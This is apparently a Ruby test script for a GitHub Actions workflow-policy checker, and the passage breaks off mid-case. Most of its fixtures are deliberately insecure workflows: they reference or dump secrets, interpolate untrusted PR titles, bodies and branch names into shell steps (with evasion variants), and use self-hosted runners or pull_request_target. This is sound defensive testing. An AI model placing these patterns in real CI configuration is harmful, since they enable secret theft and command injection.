#!/usr/bin/env ruby

require 'fileutils'
require 'open3'
require 'tmpdir'
require 'yaml'

checker = File.expand_path('check-workflow-policy.rb', __dir__)
fixture_generator = File.expand_path('create-secret-scan-regression-fixtures.sh', __dir__)
safe_sha = '0123456789abcdef0123456789abcdef01234567'

def checkout_step(safe_sha)
  {
    'uses' => "actions/checkout@#{safe_sha}",
    'with' => { 'persist-credentials' => false }
  }
end

def standard_job(safe_sha, overrides = {})
  {
    'runs-on' => 'ubuntu-latest',
    'timeout-minutes' => 5,
    'permissions' => { 'contents' => 'read' },
    'steps' => [checkout_step(safe_sha), { 'run' => 'echo safe' }]
  }.merge(overrides)
end

def workflow_yaml(safe_sha, events: ['push'], permissions: { 'contents' => 'read' }, jobs: nil)
  workflow = {
    'name' => 'Policy fixture',
    'on' => events,
    'permissions' => permissions,
    'jobs' => jobs || { 'test' => standard_job(safe_sha) }
  }
  YAML.dump(workflow)
end

def amend_workflow(source)
  workflow = YAML.safe_load(source, permitted_classes: [], permitted_symbols: [], aliases: false)
  yield workflow
  YAML.dump(workflow)
end

cases = {}
wrapped_expression_case_names = []
implicit_if_expression_case_names = []
downloader_canonicalization_case_names = []
add_case = lambda do |name, content, should_pass, expected_error = nil|
  cases[name] = [content, should_pass, expected_error]
end

manifest_workflow = workflow_yaml(safe_sha)
add_case.call('missing-workflow-directory', :missing_workflow_directory, false, 'workflow directory is missing')
add_case.call('empty-workflow-directory', {}, false, 'workflow directory must contain workflow files')
add_case.call(
  'only-unrelated-workflow',
  { 'unrelated.yml' => manifest_workflow },
  false,
  'ci.yml: required workflow must exist as a regular non-symlink file'
)
add_case.call(
  'missing-ci-workflow',
  { 'security.yml' => manifest_workflow },
  false,
  'ci.yml: required workflow must exist as a regular non-symlink file'
)
add_case.call(
  'missing-security-workflow',
  { 'ci.yml' => manifest_workflow },
  false,
  'security.yml: required workflow must exist as a regular non-symlink file'
)
add_case.call(
  'symlinked-required-workflow',
  :symlinked_required_workflow,
  false,
  'ci.yml: required workflow must exist as a regular non-symlink file'
)
add_case.call(
  'non-regular-required-workflow',
  :non_regular_required_workflow,
  false,
  'ci.yml: required workflow must exist as a regular non-symlink file'
)
add_case.call(
  'required-workflows-present',
  { 'ci.yml' => manifest_workflow, 'security.yml' => manifest_workflow },
  true
)

add_case.call('safe', workflow_yaml(safe_sha), true)
add_case.call(
  'codeql-security-events-write',
  workflow_yaml(
    safe_sha,
    events: {
      'push' => { 'branches' => ['staging'] },
      'schedule' => [{ 'cron' => '0 0 * * 1' }]
    },
    jobs: {
      'codeql' => standard_job(
        safe_sha,
        'permissions' => { 'contents' => 'read', 'security-events' => 'write' },
        'steps' => [
          checkout_step(safe_sha),
          { 'uses' => "github/codeql-action/init@#{safe_sha}", 'with' => { 'languages' => 'javascript-typescript' } },
          { 'uses' => "github/codeql-action/analyze@#{safe_sha}" }
        ]
      )
    }
  ),
  true
)

add_case.call('top-write-all', workflow_yaml(safe_sha, permissions: 'write-all'), false, 'top-level permissions: write-all is forbidden')
add_case.call('top-permissions-read-all', workflow_yaml(safe_sha, permissions: 'read-all'), false, 'top-level permissions: read-all is forbidden')
add_case.call('top-permissions-string', workflow_yaml(safe_sha, permissions: 'contents: read'), false, 'top-level permissions must be an explicit mapping')
add_case.call(
  'job-write-all',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'permissions' => 'write-all') }),
  false,
  'job unsafe permissions: write-all is forbidden'
)
add_case.call(
  'job-permissions-read-all',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'permissions' => 'read-all') }),
  false,
  'job unsafe permissions: read-all is forbidden'
)
add_case.call(
  'job-permissions-missing',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha).tap { |job| job.delete('permissions') } }),
  false,
  'job unsafe permissions must be an explicit mapping'
)
add_case.call(
  'job-permissions-string',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'permissions' => 'contents: read') }),
  false,
  'job unsafe permissions must be an explicit mapping'
)
add_case.call(
  'push-write-all',
  workflow_yaml(safe_sha, permissions: 'write-all'),
  false,
  'write-all is forbidden'
)
add_case.call(
  'push-contents-write',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'permissions' => { 'contents' => 'write' }) }),
  false,
  'write permission contents: write is forbidden'
)
add_case.call(
  'id-token-write',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'permissions' => { 'id-token' => 'write' }) }),
  false,
  'write permission id-token: write is forbidden'
)
add_case.call(
  'codeql-write-on-workflow-dispatch',
  workflow_yaml(
    safe_sha,
    events: ['workflow_dispatch'],
    jobs: {
      'codeql' => standard_job(
        safe_sha,
        'permissions' => { 'security-events' => 'write' },
        'steps' => [{ 'uses' => "github/codeql-action/analyze@#{safe_sha}" }]
      )
    }
  ),
  false,
  'write permission security-events: write is forbidden'
)
add_case.call(
  'codeql-step-in-unapproved-job',
  workflow_yaml(
    safe_sha,
    jobs: {
      'ordinary-build' => standard_job(
        safe_sha,
        'permissions' => { 'security-events' => 'write' },
        'steps' => [{ 'uses' => "github/codeql-action/analyze@#{safe_sha}" }]
      )
    }
  ),
  false,
  'write permission security-events: write is forbidden'
)
add_case.call(
  'pr-job-write',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'permissions' => { 'issues' => 'write' }) }),
  false,
  'write permission issues: write is forbidden'
)

missing_permissions = YAML.safe_load(workflow_yaml(safe_sha), aliases: false)
missing_permissions.delete('permissions')
add_case.call('missing-top-permissions', YAML.dump(missing_permissions), false, 'top-level permissions must be declared')
add_case.call(
  'missing-timeout',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha).tap { |job| job.delete('timeout-minutes') } }),
  false,
  'must declare timeout-minutes'
)
add_case.call(
  'timeout-zero',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'timeout-minutes' => 0) }),
  false,
  'timeout-minutes must be an integer from 1 to 60'
)
add_case.call(
  'timeout-over-limit',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'timeout-minutes' => 61) }),
  false,
  'timeout-minutes must be an integer from 1 to 60'
)
add_case.call(
  'timeout-expression',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'timeout-minutes' => '${{ matrix.timeout }}') }),
  false,
  'timeout-minutes must be an integer from 1 to 60'
)
add_case.call(
  'timeout-string',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'timeout-minutes' => '5') }),
  false,
  'timeout-minutes must be an integer from 1 to 60'
)
add_case.call('timeout-minimum', workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'timeout-minutes' => 1) }), true)
add_case.call('timeout-maximum', workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'timeout-minutes' => 60) }), true)
add_case.call(
  'missing-persist-credentials',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => "actions/checkout@#{safe_sha}" }]) }),
  false,
  'must set persist-credentials: false'
)
add_case.call(
  'persist-credentials-true',
  workflow_yaml(
    safe_sha,
    jobs: {
      'unsafe' => standard_job(
        safe_sha,
        'steps' => [{ 'uses' => "actions/checkout@#{safe_sha}", 'with' => { 'persist-credentials' => true } }]
      )
    }
  ),
  false,
  'must set persist-credentials: false'
)
add_case.call('pull-request-target', workflow_yaml(safe_sha, events: ['pull_request_target']), false, 'pull_request_target is forbidden')
add_case.call(
  'floating-step-action',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => 'actions/checkout@v5' }]) }),
  false,
  'action is not pinned'
)
add_case.call(
  'floating-job-action',
  workflow_yaml(
    safe_sha,
    jobs: { 'unsafe' => { 'uses' => 'actions/reusable-workflows/.github/workflows/reuse.yml@main', 'timeout-minutes' => 5 } }
  ),
  false,
  'reusable workflow is not pinned'
)
add_case.call(
  'docker-tag',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => 'docker://alpine:3.20' }]) }),
  false,
  'action is not pinned'
)
add_case.call(
  'unapproved-pinned-docker-image',
  workflow_yaml(
    safe_sha,
    jobs: {
      'unsafe' => standard_job(
        safe_sha,
        'steps' => [{ 'uses' => "docker://unapproved.invalid/scanner@sha256:#{'a' * 64}" }]
      )
    }
  ),
  false,
  'docker image is not approved'
)
add_case.call(
  'unapproved-pinned-action',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => "unapproved/action@#{safe_sha}" }]) }),
  false,
  'action repository is not approved'
)
add_case.call(
  'local-composite-action',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => './.github/actions/composite' }]) }),
  false,
  'local actions and local reusable workflows are forbidden in policy v1'
)
add_case.call(
  'local-javascript-action',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => './.github/actions/javascript' }]) }),
  false,
  'local actions and local reusable workflows are forbidden in policy v1'
)
add_case.call(
  'local-reusable-workflow',
  workflow_yaml(
    safe_sha,
    jobs: { 'unsafe' => { 'uses' => './.github/workflows/reusable.yml', 'timeout-minutes' => 5 } }
  ),
  false,
  'local actions and local reusable workflows are forbidden in policy v1'
)
add_case.call(
  'local-action-hides-floating-action',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => './.github/actions/hides-floating-action' }]) }),
  false,
  'local actions and local reusable workflows are forbidden in policy v1'
)

add_case.call(
  'job-container-string',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'container' => 'unapproved.invalid/runner:latest') }),
  false,
  'containers are forbidden in policy v1'
)
add_case.call(
  'job-container-mapping',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'container' => { 'image' => 'unapproved.invalid/runner:latest' }) }),
  false,
  'containers are forbidden in policy v1'
)
add_case.call(
  'job-container-dynamic-expression',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'container' => '${{ matrix.container }}') }),
  false,
  'containers are forbidden in policy v1'
)
add_case.call(
  'job-service-string',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'services' => 'unapproved.invalid/service:latest') }),
  false,
  'services are forbidden in policy v1'
)
add_case.call(
  'job-service-mapping',
  workflow_yaml(
    safe_sha,
    jobs: { 'unsafe' => standard_job(safe_sha, 'services' => { 'database' => { 'image' => 'unapproved.invalid/database:latest' } }) }
  ),
  false,
  'services are forbidden in policy v1'
)
add_case.call(
  'job-service-dynamic-expression',
  workflow_yaml(
    safe_sha,
    jobs: { 'unsafe' => standard_job(safe_sha, 'services' => { 'database' => '${{ matrix.service }}' }) }
  ),
  false,
  'services are forbidden in policy v1'
)
add_case.call(
  'pinned-but-forbidden-job-container',
  workflow_yaml(
    safe_sha,
    jobs: { 'unsafe' => standard_job(safe_sha, 'container' => "approved.invalid/runner@sha256:#{'a' * 64}") }
  ),
  false,
  'containers are forbidden in policy v1'
)
add_case.call(
  'pinned-but-forbidden-service',
  workflow_yaml(
    safe_sha,
    jobs: {
      'unsafe' => standard_job(
        safe_sha,
        'services' => { 'database' => { 'image' => "approved.invalid/database@sha256:#{'b' * 64}" } }
      )
    }
  ),
  false,
  'services are forbidden in policy v1'
)

add_case.call(
  'dot-secret',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.TEST_KEY }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'bracket-secret',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => "${{ secrets['KEY'] }}" }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'dynamic-secret',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets[matrix.key] }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'all-secrets-json',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEYS' => '${{ toJSON(secrets) }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'secrets-inherit',
  workflow_yaml(
    safe_sha,
    events: ['pull_request'],
    jobs: {
      'unsafe' => {
        'uses' => './.github/workflows/reusable.yml',
        'timeout-minutes' => 5,
        'secrets' => 'inherit'
      }
    }
  ),
  false,
  'must not use secrets: inherit'
)
add_case.call(
  'local-reusable-secrets-inherit',
  workflow_yaml(
    safe_sha,
    events: ['pull_request'],
    jobs: {
      'unsafe' => {
        'uses' => './.github/workflows/local-security.yml',
        'timeout-minutes' => 5,
        'secrets' => 'inherit'
      }
    }
  ),
  false,
  'must not use secrets: inherit'
)
add_case.call(
  'production-secret',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.STRIPE_LIVE_KEY }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'bare-secret-object',
  workflow_yaml(safe_sha, events: ['push'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEYS' => '${{ secrets }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'schedule-secret',
  workflow_yaml(
    safe_sha,
    events: { 'schedule' => [{ 'cron' => '0 0 * * 1' }] },
    jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.SCHEDULE_KEY }}' }) }
  ),
  false,
  'must not reference secrets'
)
add_case.call(
  'push-secret',
  workflow_yaml(safe_sha, events: ['push'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.PUSH_KEY }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'workflow-dispatch-secret',
  workflow_yaml(safe_sha, events: ['workflow_dispatch'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.DISPATCH_KEY }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'workflow-run-secret',
  workflow_yaml(
    safe_sha,
    events: { 'workflow_run' => { 'workflows' => ['CI'], 'types' => ['completed'] } },
    jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.WORKFLOW_RUN_KEY }}' }) }
  ),
  false,
  'must not reference secrets'
)
add_case.call(
  'issue-comment-secret',
  workflow_yaml(safe_sha, events: ['issue_comment'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.ISSUE_COMMENT_KEY }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'workflow-call-secret',
  workflow_yaml(safe_sha, events: ['workflow_call'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.WORKFLOW_CALL_KEY }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'workflow-call-secret-declaration',
  workflow_yaml(
    safe_sha,
    events: { 'workflow_call' => { 'secrets' => { 'CALLER_TOKEN' => { 'required' => true } } } }
  ),
  false,
  'must not declare or pass secrets'
)
add_case.call(
  'workflow-call-secrets-inherit',
  workflow_yaml(
    safe_sha,
    events: ['workflow_call'],
    jobs: {
      'unsafe' => {
        'uses' => './.github/workflows/local-security.yml',
        'timeout-minutes' => 5,
        'secrets' => 'inherit'
      }
    }
  ),
  false,
  'must not use secrets: inherit'
)
add_case.call(
  'local-reusable-workflow-environment-secret',
  workflow_yaml(
    safe_sha,
    events: ['push'],
    jobs: {
      'unsafe' => {
        'uses' => './.github/workflows/local-security.yml',
        'timeout-minutes' => 5,
        'secrets' => { 'environment_token' => '${{ secrets.STAGING_ENVIRONMENT_TOKEN }}' }
      }
    }
  ),
  false,
  'must not reference secrets'
)

add_case.call(
  'self-hosted-runner',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => ['self-hosted', 'linux']) }),
  false,
  'must use an approved GitHub-hosted runner'
)
add_case.call(
  'custom-runner-label',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => 'corp-linux') }),
  false,
  'must use an approved GitHub-hosted runner'
)
add_case.call(
  'dynamic-runner-expression',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => '${{ matrix.runner }}') }),
  false,
  'must use an approved GitHub-hosted runner'
)
add_case.call(
  'issue-comment-self-hosted-runner',
  workflow_yaml(safe_sha, events: ['issue_comment'], jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => ['self-hosted', 'linux']) }),
  false,
  'must use an approved GitHub-hosted runner'
)
add_case.call(
  'workflow-run-self-hosted-runner',
  workflow_yaml(
    safe_sha,
    events: { 'workflow_run' => { 'workflows' => ['CI'], 'types' => ['completed'] } },
    jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => 'self-hosted') }
  ),
  false,
  'must use an approved GitHub-hosted runner'
)
add_case.call(
  'schedule-self-hosted-runner',
  workflow_yaml(
    safe_sha,
    events: { 'schedule' => [{ 'cron' => '0 0 * * 1' }] },
    jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => ['self-hosted', 'scheduled']) }
  ),
  false,
  'must use an approved GitHub-hosted runner'
)
add_case.call(
  'push-custom-runner',
  workflow_yaml(safe_sha, events: ['push'], jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => 'corp-linux') }),
  false,
  'must use an approved GitHub-hosted runner'
)

add_case.call(
  'job-continue-on-error-true',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'continue-on-error' => true) }),
  false,
  'job unsafe continue-on-error must be explicitly false when present'
)
add_case.call(
  'job-continue-on-error-expression',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'continue-on-error' => '${{ matrix.allow_failure }}') }),
  false,
  'job unsafe continue-on-error must be explicitly false when present'
)
add_case.call(
  'job-continue-on-error-string',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'continue-on-error' => 'false') }),
  false,
  'job unsafe continue-on-error must be explicitly false when present'
)
add_case.call(
  'step-continue-on-error-true',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'exit 1', 'continue-on-error' => true }]) }),
  false,
  'step 1 in job unsafe continue-on-error must be explicitly false when present'
)
add_case.call(
  'step-continue-on-error-expression',
  workflow_yaml(
    safe_sha,
    jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'exit 1', 'continue-on-error' => '${{ matrix.allow_failure }}' }]) }
  ),
  false,
  'step 1 in job unsafe continue-on-error must be explicitly false when present'
)
add_case.call(
  'step-continue-on-error-string',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'exit 1', 'continue-on-error' => 'false' }]) }),
  false,
  'step 1 in job unsafe continue-on-error must be explicitly false when present'
)
add_case.call(
  'job-continue-on-error-false',
  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'continue-on-error' => false) }),
  true
)
add_case.call(
  'step-continue-on-error-false',
  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'echo safe', 'continue-on-error' => false }]) }),
  true
)

untrusted_context_cases = {
  'untrusted-context-in-top-level-env' => lambda { |workflow| workflow['env'] = { 'HEAD' => '${{ github.event.pull_request.head.ref }}' } },
  'untrusted-context-in-job-env' => lambda { |workflow| workflow['jobs']['test']['env'] = { 'HEAD' => '${{ github.event.pull_request.head.ref }}' } },
  'untrusted-context-in-step-env' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['env'] = { 'HEAD' => '${{ github.event.pull_request.head.ref }}' } },
  'untrusted-context-in-action-with' => lambda { |workflow| workflow['jobs']['test']['steps'][0]['with']['ref'] = '${{ github.event.pull_request.head.ref }}' },
  'untrusted-context-in-job-if' => lambda { |workflow| workflow['jobs']['test']['if'] = '${{ github.event.pull_request.head.ref }}' },
  'untrusted-context-in-step-if' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = '${{ github.event.pull_request.head.ref }}' },
  'untrusted-context-in-job-output' => lambda { |workflow| workflow['jobs']['test']['outputs'] = { 'head' => '${{ github.event.pull_request.head.ref }}' } },
  'untrusted-context-in-step-output' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['outputs'] = { 'head' => '${{ github.event.pull_request.head.ref }}' } },
  'untrusted-context-in-matrix' => lambda { |workflow| workflow['jobs']['test']['strategy'] = { 'matrix' => { 'head' => ['${{ github.event.pull_request.head.ref }}'] } } },
  'untrusted-context-in-concurrency' => lambda { |workflow| workflow['concurrency'] = { 'group' => '${{ github.event.pull_request.head.ref }}' } },
  'untrusted-context-in-working-directory' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['working-directory'] = '${{ github.event.pull_request.head.ref }}' },
  'untrusted-context-in-shell' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['shell'] = '${{ github.event.pull_request.head.ref }}' },
  'untrusted-context-bracket-notation-outside-run' => lambda { |workflow| workflow['env'] = { 'HEAD' => "${{ github['event']['pull_request']['head']['ref'] }}" } },
  'untrusted-context-whole-event-outside-run' => lambda { |workflow| workflow['name'] = '${{ github.event }}' },
  'untrusted-context-nested-function-outside-run' => lambda { |workflow| workflow['concurrency'] = { 'group' => "${{ format('{0}', contains(toJSON(github.event.pull_request), github.sha)) }}" } },
  'untrusted-context-in-reusable-workflow-input' => lambda do |workflow|
    workflow['jobs']['reuse'] = {
      'uses' => "actions/checkout/.github/workflows/reusable.yml@#{safe_sha}",
      'timeout-minutes' => 5,
      'permissions' => { 'contents' => 'read' },
      'with' => { 'head' => '${{ github.event.pull_request.head.ref }}' }
    }
  end
}

untrusted_context_cases.each do |name, mutation|
  content = amend_workflow(workflow_yaml(safe_sha)) { |workflow| mutation.call(workflow) }
  add_case.call(
    name,
    content,
    false,
    'direct github context interpolation is forbidden except github.sha and github.event_name'
  )
end

add_case.call(
  'safe-github-sha-in-env',
  amend_workflow(workflow_yaml(safe_sha)) { |workflow| workflow['env'] = { 'COMMIT' => '${{ github.sha }}' } },
  true
)
add_case.call(
  'safe-github-event-name-in-if',
  amend_workflow(workflow_yaml(safe_sha)) { |workflow| workflow['jobs']['test']['if'] = "${{ github.event_name == 'push' }}" },
  true
)

implicit_if_failure_cases = {
  'job-if-implicit-untrusted-head-ref' => lambda { |workflow| workflow['jobs']['test']['if'] = "github.event.pull_request.head.ref == 'main'" },
  'step-if-implicit-untrusted-head-ref' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "github.event.pull_request.head.ref == 'main'" },
  'job-if-implicit-whole-event' => lambda { |workflow| workflow['jobs']['test']['if'] = 'github.event' },
  'step-if-implicit-whole-pull-request' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = 'github.event.pull_request' },
  'job-if-implicit-bracket-notation' => lambda { |workflow| workflow['jobs']['test']['if'] = "github['event']['pull_request']['head']['ref'] == 'main'" },
  'step-if-implicit-mixed-dot-bracket' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "github.event['pull_request'].head['ref'] == 'main'" },
  'job-if-implicit-case-variant' => lambda { |workflow| workflow['jobs']['test']['if'] = "GITHUB.EVENT.PULL_REQUEST.HEAD.REF == 'main'" },
  'step-if-implicit-whitespace-variant' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "github . event . pull_request . head . ref == 'main'" },
  'job-if-implicit-nested-contains' => lambda { |workflow| workflow['jobs']['test']['if'] = "contains(toJSON(github.event.pull_request), 'main')" },
  'step-if-implicit-nested-format' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "format('{0}', github.event.pull_request.head.ref) == 'main'" },
  'job-if-implicit-tojson' => lambda { |workflow| workflow['jobs']['test']['if'] = "toJSON(github.event) != ''" },
  'step-if-implicit-github-ref' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "github.ref == 'refs/heads/main'" }
}

implicit_if_failure_cases.each do |name, mutation|
  implicit_if_expression_case_names << name
  add_case.call(
    name,
    amend_workflow(workflow_yaml(safe_sha)) { |workflow| mutation.call(workflow) },
    false,
    'if expression direct github context is forbidden except github.sha and github.event_name'
  )
end

{
  'job-if-wrapped-untrusted-context' => lambda { |workflow| workflow['jobs']['test']['if'] = "${{ github.event.pull_request.head.ref == 'main' }}" },
  'step-if-wrapped-untrusted-context' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "${{ github.event.pull_request.head.ref == 'main' }}" }
}.each do |name, mutation|
  wrapped_expression_case_names << name
  add_case.call(
    name,
    amend_workflow(workflow_yaml(safe_sha)) { |workflow| mutation.call(workflow) },
    false,
    'direct github context interpolation is forbidden except github.sha and github.event_name'
  )
end

{
  'job-if-implicit-safe-event-name' => lambda { |workflow| workflow['jobs']['test']['if'] = "github.event_name == 'push'" },
  'step-if-implicit-safe-event-name' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "github.event_name == 'push'" },
  'job-if-implicit-safe-sha' => lambda { |workflow| workflow['jobs']['test']['if'] = "github.sha != ''" }
}.each do |name, mutation|
  implicit_if_expression_case_names << name
  add_case.call(name, amend_workflow(workflow_yaml(safe_sha)) { |workflow| mutation.call(workflow) }, true)
end

wrapped_expression_case_names << 'step-if-wrapped-safe-sha'
add_case.call(
  'step-if-wrapped-safe-sha',
  amend_workflow(workflow_yaml(safe_sha)) { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "${{ github.sha != '' }}" },
  true
)
add_case.call(
  'ordinary-string-without-expression-remains-ordinary',
  amend_workflow(workflow_yaml(safe_sha)) { |workflow| workflow['env'] = { 'NOTE' => 'github.event.pull_request.head.ref is documentation' } },
  true
)

{
  'whole-pull-request-context' => 'echo "${{ github.event.pull_request }}"',
  'whole-event-context' => 'echo "${{ github.event }}"',
  'tojson-pull-request-context' => 'echo "${{ toJSON(github.event.pull_request) }}"',
  'nested-format-github-context' => 'echo "${{ format(\'{0}\', contains(toJSON(github.event.pull_request), github.sha)) }}"',
  'quoted-closing-braces-github-context' => 'echo "${{ format(\'}}\', github.event.pull_request.title) }}"',
  'untrusted-pr-title-in-run' => 'echo "${{ github.event.pull_request.title }}"',
  'untrusted-pr-body-in-run' => 'echo "${{ github.event.pull_request.body }}"',
  'untrusted-pr-head-ref-in-run' => 'echo "${{ github.event.pull_request.head.ref }}"',
  'untrusted-pr-head-label-in-run' => 'echo "${{ github.event.pull_request.head.label }}"',
  'untrusted-pr-head-object-in-run' => 'echo "${{ toJSON(github.event.pull_request.head) }}"',
  'untrusted-pr-head-label-bracket-in-run' => 'echo "${{ github[\'event\'][\'pull_request\'][\'head\'][\'label\'] }}"',
  'untrusted-pr-head-label-double-bracket-in-run' => 'echo "${{ github["event"]["pull_request"]["head"]["label"] }}"',
  'untrusted-pr-head-label-mixed-notation-in-run' => 'echo "${{ github.event[\'pull_request\'].head[\'label\'] }}"',
  'untrusted-pr-head-label-case-variant-in-run' => 'echo "${{ GITHUB.EVENT.PULL_REQUEST.HEAD.LABEL }}"',
  'untrusted-pr-head-label-whitespace-variant-in-run' => 'echo "${{ github . event . pull_request . head . label }}"',
  'untrusted-issue-title-in-run' => 'echo "${{ github.event.issue.title }}"',
  'untrusted-issue-body-in-run' => 'echo "${{ github.event.issue.body }}"',
  'untrusted-comment-body-in-run' => 'echo "${{ github.event.comment.body }}"',
  'untrusted-review-body-in-run' => 'echo "${{ github.event.review.body }}"',
  'untrusted-review-comment-body-in-run' => 'echo "${{ github.event.review_comment.body }}"',
  'untrusted-discussion-title-in-run' => 'echo "${{ github.event.discussion.title }}"',
  'untrusted-discussion-body-in-run' => 'echo "${{ github.event.discussion.body }}"',
  'untrusted-workflow-run-head-branch-in-run' => 'echo "${{ github.event.workflow_run.head_branch }}"',
  'untrusted-head-ref-in-run' => 'echo "${{ github.head_ref }}"',
  'untrusted-ref-name-in-run' => 'echo "${{ github.ref_name }}"',
  'untrusted-commit-message-in-run' => 'echo "${{ github.event.head_commit.message }}"'
}.each do |name, command|
  add_case.call(
    name,
    workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => command }]) }),
    false,
    'direct github context interpolation is forbidden except github.sha and github.event_name'
  )
end
add_case.call(
  'safe-github-event-name',
  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'echo "${{ github.event_name }}"' }]) }),
  true
)
add_case.call(
  'safe-github-sha',
  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'echo "${{ github.sha }}"' }]) }),
  true
)
add_case.call(
  'trusted-event-name-in-run',
  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'echo "${{ github.event_name }}"' }]) }),
  true
)
add_case.call(
  'trusted-sha-in-run',
  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'echo "${{ github.sha }}"' }]) }),
  true
)
add_case.call(
  'trusted-pr-number-in-run',
